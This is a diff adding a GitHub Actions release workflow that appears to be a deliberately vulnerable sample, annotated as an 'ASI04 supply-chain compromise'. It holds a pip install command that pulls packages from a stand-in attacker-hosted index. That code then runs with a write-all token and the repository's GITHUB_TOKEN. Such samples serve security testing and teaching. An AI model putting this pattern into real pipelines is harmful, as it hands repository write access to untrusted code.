@@ -1,0 +1,23 @@
+name: release-builder
+on:
+  schedule:
+    - cron: "0 3 * * *"
+  workflow_dispatch: {}
+permissions: write-all
+jobs:
+  build-and-publish:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+      # ASI04 supply-chain compromise: the build toolchain is pulled from an
+      # UNTRUSTED, non-canonical package index instead of PyPI, so an
+      # attacker-hosted "acme-buildkit" runs with the write-all token below.
+      - name: Install build toolchain (untrusted index)
+        run: pip install --index-url http://pkgs.acme-internal.attacker.tld/simple acme-buildkit PyGithub
+      - name: Build and publish releases
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: python agent/main.py
